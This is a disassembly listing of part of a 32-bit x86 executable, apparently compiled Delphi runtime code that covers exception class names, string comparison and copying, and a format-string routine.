  404aa7:	00 c4                	add    %al,%ah
  404aa9:	29 40 00             	sub    %eax,0x0(%eax)
  404aac:	ac                   	lods   %ds:(%esi),%al
  404aad:	28 40 00             	sub    %al,0x0(%eax)
  404ab0:	d4 28                	aam    $0x28
  404ab2:	40                   	inc    %eax
  404ab3:	00 18                	add    %bl,(%eax)
  404ab5:	29 40 00             	sub    %eax,0x0(%eax)
  404ab8:	0a 45 50             	or     0x50(%ebp),%al
  404abb:	72 69                	jb     0x404b26
  404abd:	76 69                	jbe    0x404b28
  404abf:	6c                   	insb   (%dx),%es:(%edi)
  404ac0:	65 67 65 90          	gs addr16 gs nop
	...
  404adc:	f8                   	clc
  404add:	4a                   	dec    %edx
  404ade:	40                   	inc    %eax
  404adf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404ae2:	00 00                	add    %al,(%eax)
  404ae4:	50                   	push   %eax
  404ae5:	46                   	inc    %esi
  404ae6:	40                   	inc    %eax
  404ae7:	00 c4                	add    %al,%ah
  404ae9:	29 40 00             	sub    %eax,0x0(%eax)
  404aec:	ac                   	lods   %ds:(%esi),%al
  404aed:	28 40 00             	sub    %al,0x0(%eax)
  404af0:	d4 28                	aam    $0x28
  404af2:	40                   	inc    %eax
  404af3:	00 18                	add    %bl,(%eax)
  404af5:	29 40 00             	sub    %eax,0x0(%eax)
  404af8:	0e                   	push   %cs
  404af9:	45                   	inc    %ebp
  404afa:	53                   	push   %ebx
  404afb:	74 61                	je     0x404b5e
  404afd:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  404b00:	76 65                	jbe    0x404b67
  404b02:	72 66                	jb     0x404b6a
  404b04:	6c                   	insb   (%dx),%es:(%edi)
  404b05:	6f                   	outsl  %ds:(%esi),(%dx)
  404b06:	77 90                	ja     0x404a98
	...
  404b20:	3c 4b                	cmp    $0x4b,%al
  404b22:	40                   	inc    %eax
  404b23:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404b26:	00 00                	add    %al,(%eax)
  404b28:	50                   	push   %eax
  404b29:	46                   	inc    %esi
  404b2a:	40                   	inc    %eax
  404b2b:	00 c4                	add    %al,%ah
  404b2d:	29 40 00             	sub    %eax,0x0(%eax)
  404b30:	ac                   	lods   %ds:(%esi),%al
  404b31:	28 40 00             	sub    %al,0x0(%eax)
  404b34:	d4 28                	aam    $0x28
  404b36:	40                   	inc    %eax
  404b37:	00 18                	add    %bl,(%eax)
  404b39:	29 40 00             	sub    %eax,0x0(%eax)
  404b3c:	09 45 43             	or     %eax,0x43(%ebp)
  404b3f:	6f                   	outsl  %ds:(%esi),(%dx)
  404b40:	6e                   	outsb  %ds:(%esi),(%dx)
  404b41:	74 72                	je     0x404bb5
  404b43:	6f                   	outsl  %ds:(%esi),(%dx)
  404b44:	6c                   	insb   (%dx),%es:(%edi)
  404b45:	43                   	inc    %ebx
  404b46:	8b c0                	mov    %eax,%eax
	...
  404b60:	7c 4b                	jl     0x404bad
  404b62:	40                   	inc    %eax
  404b63:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404b66:	00 00                	add    %al,(%eax)
  404b68:	50                   	push   %eax
  404b69:	46                   	inc    %esi
  404b6a:	40                   	inc    %eax
  404b6b:	00 c4                	add    %al,%ah
  404b6d:	29 40 00             	sub    %eax,0x0(%eax)
  404b70:	ac                   	lods   %ds:(%esi),%al
  404b71:	28 40 00             	sub    %al,0x0(%eax)
  404b74:	d4 28                	aam    $0x28
  404b76:	40                   	inc    %eax
  404b77:	00 18                	add    %bl,(%eax)
  404b79:	29 40 00             	sub    %eax,0x0(%eax)
  404b7c:	0d 45 56 61 72       	or     $0x72615645,%eax
  404b81:	69 61 6e 74 45 72 72 	imul   $0x72724574,0x6e(%ecx),%esp
  404b88:	6f                   	outsl  %ds:(%esi),(%dx)
  404b89:	72 8b                	jb     0x404b16
  404b8b:	c0 00 00             	rolb   $0x0,(%eax)
	...
  404ba2:	00 00                	add    %al,(%eax)
  404ba4:	c0 4b 40 00          	rorb   $0x0,0x40(%ebx)
  404ba8:	10 00                	adc    %al,(%eax)
  404baa:	00 00                	add    %al,(%eax)
  404bac:	50                   	push   %eax
  404bad:	46                   	inc    %esi
  404bae:	40                   	inc    %eax
  404baf:	00 c4                	add    %al,%ah
  404bb1:	29 40 00             	sub    %eax,0x0(%eax)
  404bb4:	ac                   	lods   %ds:(%esi),%al
  404bb5:	28 40 00             	sub    %al,0x0(%eax)
  404bb8:	d4 28                	aam    $0x28
  404bba:	40                   	inc    %eax
  404bbb:	00 18                	add    %bl,(%eax)
  404bbd:	29 40 00             	sub    %eax,0x0(%eax)
  404bc0:	12 45 45             	adc    0x45(%ebp),%al
  404bc3:	78 74                	js     0x404c39
  404bc5:	65 72 6e             	gs jb  0x404c36
  404bc8:	61                   	popa
  404bc9:	6c                   	insb   (%dx),%es:(%edi)
  404bca:	45                   	inc    %ebp
  404bcb:	78 63                	js     0x404c30
  404bcd:	65 70 74             	gs jo  0x404c44
  404bd0:	69 6f 6e 90 53 8b d8 	imul   $0xd88b5390,0x6e(%edi),%ebp
  404bd7:	8b cb                	mov    %ebx,%ecx
  404bd9:	b2 01                	mov    $0x1,%dl
  404bdb:	b8 2c 4a 40 00       	mov    $0x404a2c,%eax
  404be0:	e8 4b 0d 00 00       	call   0x405930
  404be5:	e8 ca e2 ff ff       	call   0x402eb4
  404bea:	5b                   	pop    %ebx
  404beb:	c3                   	ret
  404bec:	53                   	push   %ebx
  404bed:	56                   	push   %esi
  404bee:	57                   	push   %edi
  404bef:	8b f9                	mov    %ecx,%edi
  404bf1:	8b f2                	mov    %edx,%esi
  404bf3:	8b d8                	mov    %eax,%ebx
  404bf5:	56                   	push   %esi
  404bf6:	57                   	push   %edi
  404bf7:	8b cb                	mov    %ebx,%ecx
  404bf9:	b2 01                	mov    $0x1,%dl
  404bfb:	b8 2c 4a 40 00       	mov    $0x404a2c,%eax
  404c00:	e8 9b 0d 00 00       	call   0x4059a0
  404c05:	e8 aa e2 ff ff       	call   0x402eb4
  404c0a:	5f                   	pop    %edi
  404c0b:	5e                   	pop    %esi
  404c0c:	5b                   	pop    %ebx
  404c0d:	c3                   	ret
  404c0e:	8b c0                	mov    %eax,%eax
  404c10:	53                   	push   %ebx
  404c11:	56                   	push   %esi
  404c12:	8b d8                	mov    %eax,%ebx
  404c14:	8b c3                	mov    %ebx,%eax
  404c16:	e8 79 d9 ff ff       	call   0x402594
  404c1b:	8b f0                	mov    %eax,%esi
  404c1d:	8b c6                	mov    %esi,%eax
  404c1f:	33 c9                	xor    %ecx,%ecx
  404c21:	8b d3                	mov    %ebx,%edx
  404c23:	e8 54 db ff ff       	call   0x40277c
  404c28:	8b c6                	mov    %esi,%eax
  404c2a:	5e                   	pop    %esi
  404c2b:	5b                   	pop    %ebx
  404c2c:	c3                   	ret
  404c2d:	8d 40 00             	lea    0x0(%eax),%eax
  404c30:	56                   	push   %esi
  404c31:	57                   	push   %edi
  404c32:	53                   	push   %ebx
  404c33:	89 c6                	mov    %eax,%esi
  404c35:	89 d7                	mov    %edx,%edi
  404c37:	09 c0                	or     %eax,%eax
  404c39:	74 03                	je     0x404c3e
  404c3b:	8b 40 fc             	mov    -0x4(%eax),%eax
  404c3e:	09 d2                	or     %edx,%edx
  404c40:	74 03                	je     0x404c45
  404c42:	8b 52 fc             	mov    -0x4(%edx),%edx
  404c45:	89 c1                	mov    %eax,%ecx
  404c47:	39 d1                	cmp    %edx,%ecx
  404c49:	76 02                	jbe    0x404c4d
  404c4b:	89 d1                	mov    %edx,%ecx
  404c4d:	39 c9                	cmp    %ecx,%ecx
  404c4f:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  404c51:	74 2a                	je     0x404c7d
  404c53:	8a 5e ff             	mov    -0x1(%esi),%bl
  404c56:	80 fb 61             	cmp    $0x61,%bl
  404c59:	72 08                	jb     0x404c63
  404c5b:	80 fb 7a             	cmp    $0x7a,%bl
  404c5e:	77 03                	ja     0x404c63
  404c60:	80 eb 20             	sub    $0x20,%bl
  404c63:	8a 7f ff             	mov    -0x1(%edi),%bh
  404c66:	80 ff 61             	cmp    $0x61,%bh
  404c69:	72 08                	jb     0x404c73
  404c6b:	80 ff 7a             	cmp    $0x7a,%bh
  404c6e:	77 03                	ja     0x404c73
  404c70:	80 ef 20             	sub    $0x20,%bh
  404c73:	38 fb                	cmp    %bh,%bl
  404c75:	74 d8                	je     0x404c4f
  404c77:	0f b6 c3             	movzbl %bl,%eax
  404c7a:	0f b6 d7             	movzbl %bh,%edx
  404c7d:	29 d0                	sub    %edx,%eax
  404c7f:	5b                   	pop    %ebx
  404c80:	5f                   	pop    %edi
  404c81:	5e                   	pop    %esi
  404c82:	c3                   	ret
  404c83:	90                   	nop
  404c84:	83 c4 f8             	add    $0xfffffff8,%esp
  404c87:	6a 00                	push   $0x0
  404c89:	89 44 24 04          	mov    %eax,0x4(%esp)
  404c8d:	c6 44 24 08 00       	movb   $0x0,0x8(%esp)
  404c92:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  404c96:	8b c2                	mov    %edx,%eax
  404c98:	ba b0 4c 40 00       	mov    $0x404cb0,%edx
  404c9d:	e8 f6 04 00 00       	call   0x405198
  404ca2:	59                   	pop    %ecx
  404ca3:	5a                   	pop    %edx
  404ca4:	c3                   	ret
  404ca5:	00 00                	add    %al,(%eax)
  404ca7:	00 ff                	add    %bh,%bh
  404ca9:	ff                   	(bad)
  404caa:	ff                   	(bad)
  404cab:	ff 02                	incl   (%edx)
  404cad:	00 00                	add    %al,(%eax)
  404caf:	00 25 64 00 00 53    	add    %ah,0x53000064
  404cb5:	51                   	push   %ecx
  404cb6:	8b da                	mov    %edx,%ebx
  404cb8:	8b d4                	mov    %esp,%edx
  404cba:	e8 f5 da ff ff       	call   0x4027b4
  404cbf:	83 3c 24 00          	cmpl   $0x0,(%esp)
  404cc3:	74 02                	je     0x404cc7
  404cc5:	8b c3                	mov    %ebx,%eax
  404cc7:	5a                   	pop    %edx
  404cc8:	5b                   	pop    %ebx
  404cc9:	c3                   	ret
  404cca:	8b c0                	mov    %eax,%eax
  404ccc:	53                   	push   %ebx
  404ccd:	56                   	push   %esi
  404cce:	81 c4 00 fc ff ff    	add    $0xfffffc00,%esp
  404cd4:	8b f2                	mov    %edx,%esi
  404cd6:	8b d8                	mov    %eax,%ebx
  404cd8:	68 00 04 00 00       	push   $0x400
  404cdd:	8d 44 24 04          	lea    0x4(%esp),%eax
  404ce1:	50                   	push   %eax
  404ce2:	53                   	push   %ebx
  404ce3:	a1 14 c0 40 00       	mov    0x40c014,%eax
  404ce8:	50                   	push   %eax
  404ce9:	e8 5e f8 ff ff       	call   0x40454c
  404cee:	8b c8                	mov    %eax,%ecx
  404cf0:	8b d4                	mov    %esp,%edx
  404cf2:	8b c6                	mov    %esi,%eax
  404cf4:	e8 7f e5 ff ff       	call   0x403278
  404cf9:	81 c4 00 04 00 00    	add    $0x400,%esp
  404cff:	5e                   	pop    %esi
  404d00:	5b                   	pop    %ebx
  404d01:	c3                   	ret
  404d02:	8b c0                	mov    %eax,%eax
  404d04:	89 fa                	mov    %edi,%edx
  404d06:	89 c7                	mov    %eax,%edi
  404d08:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  404d0d:	30 c0                	xor    %al,%al
  404d0f:	f2 ae                	repnz scas %es:(%edi),%al
  404d11:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  404d16:	29 c8                	sub    %ecx,%eax
  404d18:	89 d7                	mov    %edx,%edi
  404d1a:	c3                   	ret
  404d1b:	90                   	nop
  404d1c:	56                   	push   %esi
  404d1d:	57                   	push   %edi
  404d1e:	89 d6                	mov    %edx,%esi
  404d20:	89 c7                	mov    %eax,%edi
  404d22:	89 ca                	mov    %ecx,%edx
  404d24:	39 f7                	cmp    %esi,%edi
  404d26:	7f 11                	jg     0x404d39
  404d28:	74 2b                	je     0x404d55
  404d2a:	c1 e9 02             	shr    $0x2,%ecx
  404d2d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404d2f:	89 d1                	mov    %edx,%ecx
  404d31:	83 e1 03             	and    $0x3,%ecx
  404d34:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404d36:	5f                   	pop    %edi
  404d37:	5e                   	pop    %esi
  404d38:	c3                   	ret
  404d39:	8d 74 0e ff          	lea    -0x1(%esi,%ecx,1),%esi
  404d3d:	8d 7c 0f ff          	lea    -0x1(%edi,%ecx,1),%edi
  404d41:	83 e1 03             	and    $0x3,%ecx
  404d44:	fd                   	std
  404d45:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404d47:	83 ee 03             	sub    $0x3,%esi
  404d4a:	83 ef 03             	sub    $0x3,%edi
  404d4d:	89 d1                	mov    %edx,%ecx
  404d4f:	c1 e9 02             	shr    $0x2,%ecx
  404d52:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404d54:	fc                   	cld
  404d55:	5f                   	pop    %edi
  404d56:	5e                   	pop    %esi
  404d57:	c3                   	ret
  404d58:	57                   	push   %edi
  404d59:	56                   	push   %esi
  404d5a:	53                   	push   %ebx
  404d5b:	89 c6                	mov    %eax,%esi
  404d5d:	89 d7                	mov    %edx,%edi
  404d5f:	89 cb                	mov    %ecx,%ebx
  404d61:	30 c0                	xor    %al,%al
  404d63:	85 c9                	test   %ecx,%ecx
  404d65:	74 05                	je     0x404d6c
  404d67:	f2 ae                	repnz scas %es:(%edi),%al
  404d69:	75 01                	jne    0x404d6c
  404d6b:	41                   	inc    %ecx
  404d6c:	29 cb                	sub    %ecx,%ebx
  404d6e:	89 f7                	mov    %esi,%edi
  404d70:	89 d6                	mov    %edx,%esi
  404d72:	89 fa                	mov    %edi,%edx
  404d74:	89 d9                	mov    %ebx,%ecx
  404d76:	c1 e9 02             	shr    $0x2,%ecx
  404d79:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404d7b:	89 d9                	mov    %ebx,%ecx
  404d7d:	83 e1 03             	and    $0x3,%ecx
  404d80:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404d82:	aa                   	stos   %al,%es:(%edi)
  404d83:	89 d0                	mov    %edx,%eax
  404d85:	5b                   	pop    %ebx
  404d86:	5e                   	pop    %esi
  404d87:	5f                   	pop    %edi
  404d88:	c3                   	ret
  404d89:	8d 40 00             	lea    0x0(%eax),%eax
  404d8c:	57                   	push   %edi
  404d8d:	50                   	push   %eax
  404d8e:	89 c7                	mov    %eax,%edi
  404d90:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  404d95:	30 c0                	xor    %al,%al
  404d97:	f2 ae                	repnz scas %es:(%edi),%al
  404d99:	f7 d1                	not    %ecx
  404d9b:	5f                   	pop    %edi
  404d9c:	88 d0                	mov    %dl,%al
  404d9e:	f2 ae                	repnz scas %es:(%edi),%al
  404da0:	b8 00 00 00 00       	mov    $0x0,%eax
  404da5:	75 03                	jne    0x404daa
  404da7:	89 f8                	mov    %edi,%eax
  404da9:	48                   	dec    %eax
  404daa:	5f                   	pop    %edi
  404dab:	c3                   	ret
  404dac:	57                   	push   %edi
  404dad:	89 c7                	mov    %eax,%edi
  404daf:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  404db4:	30 c0                	xor    %al,%al
  404db6:	f2 ae                	repnz scas %es:(%edi),%al
  404db8:	f7 d1                	not    %ecx
  404dba:	fd                   	std
  404dbb:	4f                   	dec    %edi
  404dbc:	88 d0                	mov    %dl,%al
  404dbe:	f2 ae                	repnz scas %es:(%edi),%al
  404dc0:	b8 00 00 00 00       	mov    $0x0,%eax
  404dc5:	75 03                	jne    0x404dca
  404dc7:	89 f8                	mov    %edi,%eax
  404dc9:	40                   	inc    %eax
  404dca:	fc                   	cld
  404dcb:	5f                   	pop    %edi
  404dcc:	c3                   	ret
  404dcd:	8d 40 00             	lea    0x0(%eax),%eax
  404dd0:	53                   	push   %ebx
  404dd1:	56                   	push   %esi
  404dd2:	8b f2                	mov    %edx,%esi
  404dd4:	8b d8                	mov    %eax,%ebx
  404dd6:	8b c6                	mov    %esi,%eax
  404dd8:	8b d3                	mov    %ebx,%edx
  404dda:	e8 e5 e4 ff ff       	call   0x4032c4
  404ddf:	5e                   	pop    %esi
  404de0:	5b                   	pop    %ebx
  404de1:	c3                   	ret
  404de2:	8b c0                	mov    %eax,%eax
  404de4:	53                   	push   %ebx
  404de5:	56                   	push   %esi
  404de6:	83 c4 d8             	add    $0xffffffd8,%esp
  404de9:	8b d9                	mov    %ecx,%ebx
  404deb:	8b f0                	mov    %eax,%esi
  404ded:	83 fb 1f             	cmp    $0x1f,%ebx
  404df0:	7e 05                	jle    0x404df7
  404df2:	bb 1f 00 00 00       	mov    $0x1f,%ebx
  404df7:	8b c4                	mov    %esp,%eax
  404df9:	8b cb                	mov    %ebx,%ecx
  404dfb:	e8 1c ff ff ff       	call   0x404d1c
  404e00:	c6 04 1c 00          	movb   $0x0,(%esp,%ebx,1)
  404e04:	8b c4                	mov    %esp,%eax
  404e06:	89 44 24 20          	mov    %eax,0x20(%esp)
  404e0a:	c6 44 24 24 06       	movb   $0x6,0x24(%esp)
  404e0f:	8d 54 24 20          	lea    0x20(%esp),%edx
  404e13:	8d 86 a0 ff 00 00    	lea    0xffa0(%esi),%eax
  404e19:	33 c9                	xor    %ecx,%ecx
  404e1b:	e8 cc fd ff ff       	call   0x404bec
  404e20:	83 c4 28             	add    $0x28,%esp
  404e23:	5e                   	pop    %esi
  404e24:	5b                   	pop    %ebx
  404e25:	c3                   	ret
  404e26:	8b c0                	mov    %eax,%eax
  404e28:	53                   	push   %ebx
  404e29:	56                   	push   %esi
  404e2a:	8b f2                	mov    %edx,%esi
  404e2c:	8b d8                	mov    %eax,%ebx
  404e2e:	8b c3                	mov    %ebx,%eax
  404e30:	8b d6                	mov    %esi,%edx
  404e32:	e8 6d eb ff ff       	call   0x4039a4
  404e37:	5e                   	pop    %esi
  404e38:	5b                   	pop    %ebx
  404e39:	c3                   	ret
  404e3a:	8b c0                	mov    %eax,%eax
  404e3c:	53                   	push   %ebx
  404e3d:	8b d8                	mov    %eax,%ebx
  404e3f:	8b c3                	mov    %ebx,%eax
  404e41:	e8 52 e3 ff ff       	call   0x403198
  404e46:	5b                   	pop    %ebx
  404e47:	c3                   	ret
  404e48:	55                   	push   %ebp
  404e49:	8b ec                	mov    %esp,%ebp
  404e4b:	83 c4 b8             	add    $0xffffffb8,%esp
  404e4e:	53                   	push   %ebx
  404e4f:	56                   	push   %esi
  404e50:	57                   	push   %edi
  404e51:	89 c7                	mov    %eax,%edi
  404e53:	89 ce                	mov    %ecx,%esi
  404e55:	03 4d 10             	add    0x10(%ebp),%ecx
  404e58:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404e5b:	31 c0                	xor    %eax,%eax
  404e5d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404e60:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404e63:	09 d2                	or     %edx,%edx
  404e65:	74 0e                	je     0x404e75
  404e67:	39 ce                	cmp    %ecx,%esi
  404e69:	74 0a                	je     0x404e75
  404e6b:	ac                   	lods   %ds:(%esi),%al
  404e6c:	80 f8 25             	cmp    $0x25,%al
  404e6f:	74 0e                	je     0x404e7f
  404e71:	aa                   	stos   %al,%es:(%edi)
  404e72:	4a                   	dec    %edx
  404e73:	75 f2                	jne    0x404e67
  404e75:	89 f8                	mov    %edi,%eax
  404e77:	2b 45 fc             	sub    -0x4(%ebp),%eax
  404e7a:	e9 c5 02 00 00       	jmp    0x405144
  404e7f:	39 ce                	cmp    %ecx,%esi
  404e81:	74 f2                	je     0x404e75
  404e83:	ac                   	lods   %ds:(%esi),%al
  404e84:	80 f8 25             	cmp    $0x25,%al
  404e87:	74 e8                	je     0x404e71
  404e89:	8d 5e fe             	lea    -0x2(%esi),%ebx
  404e8c:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404e8f:	88 45 ef             	mov    %al,-0x11(%ebp)
  404e92:	80 f8 2d             	cmp    $0x2d,%al
  404e95:	75 05                	jne    0x404e9c
  404e97:	39 ce                	cmp    %ecx,%esi
  404e99:	74 da                	je     0x404e75
  404e9b:	ac                   	lods   %ds:(%esi),%al
  404e9c:	e8 80 00 00 00       	call   0x404f21
  404ea1:	80 f8 3a             	cmp    $0x3a,%al
  404ea4:	75 0a                	jne    0x404eb0
  404ea6:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  404ea9:	39 ce                	cmp    %ecx,%esi
  404eab:	74 c8                	je     0x404e75
  404ead:	ac                   	lods   %ds:(%esi),%al
  404eae:	eb df                	jmp    0x404e8f
  404eb0:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  404eb3:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
  404eb8:	80 f8 2e             	cmp    $0x2e,%al
  404ebb:	75 0a                	jne    0x404ec7
  404ebd:	39 ce                	cmp    %ecx,%esi
  404ebf:	74 b4                	je     0x404e75
  404ec1:	ac                   	lods   %ds:(%esi),%al
  404ec2:	e8 5a 00 00 00       	call   0x404f21
  404ec7:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  404eca:	89 75 e0             	mov    %esi,-0x20(%ebp)
  404ecd:	51                   	push   %ecx
  404ece:	52                   	push   %edx
  404ecf:	e8 96 00 00 00       	call   0x404f6a
  404ed4:	5a                   	pop    %edx
  404ed5:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  404ed8:	29 cb                	sub    %ecx,%ebx
  404eda:	73 02                	jae    0x404ede
  404edc:	31 db                	xor    %ebx,%ebx
  404ede:	80 7d ef 2d          	cmpb   $0x2d,-0x11(%ebp)
  404ee2:	75 0a                	jne    0x404eee
  404ee4:	29 ca                	sub    %ecx,%edx
  404ee6:	73 04                	jae    0x404eec
  404ee8:	01 d1                	add    %edx,%ecx
  404eea:	31 d2                	xor    %edx,%edx
  404eec:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404eee:	87 cb                	xchg   %ecx,%ebx
  404ef0:	29 ca                	sub    %ecx,%edx
  404ef2:	73 04                	jae    0x404ef8
  404ef4:	01 d1                	add    %edx,%ecx
  404ef6:	31 d2                	xor    %edx,%edx
  404ef8:	b0 20                	mov    $0x20,%al
  404efa:	f3 aa                	rep stos %al,%es:(%edi)
  404efc:	87 cb                	xchg   %ecx,%ebx
  404efe:	29 ca                	sub    %ecx,%edx
  404f00:	73 04                	jae    0x404f06
  404f02:	01 d1                	add    %edx,%ecx
  404f04:	31 d2                	xor    %edx,%edx
  404f06:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404f08:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404f0c:	74 0a                	je     0x404f18
  404f0e:	52                   	push   %edx
  404f0f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404f12:	e8 25 ff ff ff       	call   0x404e3c
  404f17:	5a                   	pop    %edx
  404f18:	59                   	pop    %ecx
  404f19:	8b 75 e0             	mov    -0x20(%ebp),%esi
  404f1c:	e9 42 ff ff ff       	jmp    0x404e63
  404f21:	31 db                	xor    %ebx,%ebx
  404f23:	80 f8 2a             	cmp    $0x2a,%al
  404f26:	74 22                	je     0x404f4a
  404f28:	80 f8 30             	cmp    $0x30,%al
  404f2b:	72 3c                	jb     0x404f69
  404f2d:	80 f8 39             	cmp    $0x39,%al
  404f30:	77 37                	ja     0x404f69
  404f32:	6b db 0a             	imul   $0xa,%ebx,%ebx
  404f35:	80 e8 30             	sub    $0x30,%al
  404f38:	0f b6 c0             	movzbl %al,%eax
  404f3b:	01 c3                	add    %eax,%ebx
  404f3d:	39 ce                	cmp    %ecx,%esi
  404f3f:	74 03                	je     0x404f44
  404f41:	ac                   	lods   %ds:(%esi),%al
  404f42:	eb e4                	jmp    0x404f28
  404f44:	58                   	pop    %eax
  404f45:	e9 2b ff ff ff       	jmp    0x404e75
  404f4a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404f4d:	3b 45 08             	cmp    0x8(%ebp),%eax
  404f50:	77 12                	ja     0x404f64
  404f52:	ff 45 f8             	incl   -0x8(%ebp)
  404f55:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404f58:	80 7c c3 04 00       	cmpb   $0x0,0x4(%ebx,%eax,8)
  404f5d:	8b 1c c3             	mov    (%ebx,%eax,8),%ebx
  404f60:	74 02                	je     0x404f64
  404f62:	31 db                	xor    %ebx,%ebx
  404f64:	39 ce                	cmp    %ecx,%esi
  404f66:	74 dc                	je     0x404f44
  404f68:	ac                   	lods   %ds:(%esi),%al
  404f69:	c3                   	ret
  404f6a:	24 df                	and    $0xdf,%al
  404f6c:	88 c1                	mov    %al,%cl
  404f6e:	b8 01 00 00 00       	mov    $0x1,%eax
  404f73:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  404f76:	3b 5d 08             	cmp    0x8(%ebp),%ebx
  404f79:	77 50                	ja     0x404fcb
  404f7b:	ff 45 f8             	incl   -0x8(%ebp)
  404f7e:	8b 75 0c             	mov    0xc(%ebp),%esi
  404f81:	8d 34 de             	lea    (%esi,%ebx,8),%esi
  404f84:	8b 06                	mov    (%esi),%eax
  404f86:	0f b6 5e 04          	movzbl 0x4(%esi),%ebx
  404f8a:	ff 24 9d 91 4f 40 00 	jmp    *0x404f91(,%ebx,4)
  404f91:	d8 4f 40             	fmuls  0x40(%edi)
  404f94:	00 c9                	add    %cl,%cl
  404f96:	4f                   	dec    %edi
  404f97:	40                   	inc    %eax
  404f98:	00 3b                	add    %bh,(%ebx)
  404f9a:	50                   	push   %eax
  404f9b:	40                   	inc    %eax
  404f9c:	00 d2                	add    %dl,%dl
  404f9e:	50                   	push   %eax
  404f9f:	40                   	inc    %eax
  404fa0:	00 67 50             	add    %ah,0x50(%edi)
  404fa3:	40                   	inc    %eax
  404fa4:	00 b4 50 40 00 94 50 	add    %dh,0x50940040(%eax,%edx,2)
  404fab:	40                   	inc    %eax
  404fac:	00 c9                	add    %cl,%cl
  404fae:	4f                   	dec    %edi
  404faf:	40                   	inc    %eax
  404fb0:	00 c9                	add    %cl,%cl
  404fb2:	4f                   	dec    %edi
  404fb3:	40                   	inc    %eax
  404fb4:	00 c9                	add    %cl,%cl
  404fb6:	4f                   	dec    %edi
  404fb7:	40                   	inc    %eax
  404fb8:	00 c9                	add    %cl,%cl
  404fba:	4f                   	dec    %edi
  404fbb:	40                   	inc    %eax
  404fbc:	00 78 50             	add    %bh,0x50(%eax)
  404fbf:	40                   	inc    %eax
  404fc0:	00 ce                	add    %cl,%dh
  404fc2:	50                   	push   %eax
  404fc3:	40                   	inc    %eax
  404fc4:	00 46 50             	add    %al,0x50(%esi)
  404fc7:	40                   	inc    %eax
  404fc8:	00 31                	add    %dh,(%ecx)
  404fca:	c0 8b 55 f0 8b 4d e0 	rorb   $0xe0,0x4d8bf055(%ebx)
  404fd1:	29 d1                	sub    %edx,%ecx
  404fd3:	e8 0c fe ff ff       	call   0x404de4
  404fd8:	80 f9 44             	cmp    $0x44,%cl
  404fdb:	74 11                	je     0x404fee
  404fdd:	80 f9 55             	cmp    $0x55,%cl
  404fe0:	74 1e                	je     0x405000
  404fe2:	80 f9 58             	cmp    $0x58,%cl
  404fe5:	75 e2                	jne    0x404fc9
  404fe7:	b9 10 00 00 00       	mov    $0x10,%ecx
  404fec:	eb 17                	jmp    0x405005
  404fee:	09 c0                	or     %eax,%eax
  404ff0:	79 0e                	jns    0x405000
  404ff2:	f7 d8                	neg    %eax
  404ff4:	e8 07 00 00 00       	call   0x405000
  404ff9:	b0 2d                	mov    $0x2d,%al
  404ffb:	41                   	inc    %ecx
  404ffc:	4e                   	dec    %esi
  404ffd:	88 06                	mov    %al,(%esi)
  404fff:	c3                   	ret
  405000:	b9 0a 00 00 00       	mov    $0xa,%ecx
  405005:	8d 75 c8             	lea    -0x38(%ebp),%esi
  405008:	31 d2                	xor    %edx,%edx
  40500a:	f7 f1                	div    %ecx
  40500c:	80 c2 30             	add    $0x30,%dl
  40500f:	80 fa 3a             	cmp    $0x3a,%dl
  405012:	72 03                	jb     0x405017
  405014:	80 c2 07             	add    $0x7,%dl
  405017:	4e                   	dec    %esi
  405018:	88 16                	mov    %dl,(%esi)
  40501a:	09 c0                	or     %eax,%eax
  40501c:	75 ea                	jne    0x405008
  40501e:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405021:	29 f1                	sub    %esi,%ecx
  405023:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  405026:	83 fa 10             	cmp    $0x10,%edx
  405029:	72 01                	jb     0x40502c
  40502b:	c3                   	ret
  40502c:	29 ca                	sub    %ecx,%edx
  40502e:	76 0a                	jbe    0x40503a
  405030:	01 d1                	add    %edx,%ecx
  405032:	b0 30                	mov    $0x30,%al
  405034:	4e                   	dec    %esi
  405035:	88 06                	mov    %al,(%esi)
  405037:	4a                   	dec    %edx
  405038:	75 fa                	jne    0x405034
  40503a:	c3                   	ret
  40503b:	80 f9 53             	cmp    $0x53,%cl
  40503e:	75 89                	jne    0x404fc9
  405040:	b9 01 00 00 00       	mov    $0x1,%ecx
  405045:	c3                   	ret
  405046:	80 f9 53             	cmp    $0x53,%cl
  405049:	0f 85 7a ff ff ff    	jne    0x404fc9
  40504f:	66 83 38 01          	cmpw   $0x1,(%eax)
  405053:	76 0f                	jbe    0x405064
  405055:	89 c2                	mov    %eax,%edx
  405057:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40505a:	e8 c9 fd ff ff       	call   0x404e28
  40505f:	8b 75 f4             	mov    -0xc(%ebp),%esi
  405062:	eb 1f                	jmp    0x405083
  405064:	31 c9                	xor    %ecx,%ecx
  405066:	c3                   	ret
  405067:	80 f9 53             	cmp    $0x53,%cl
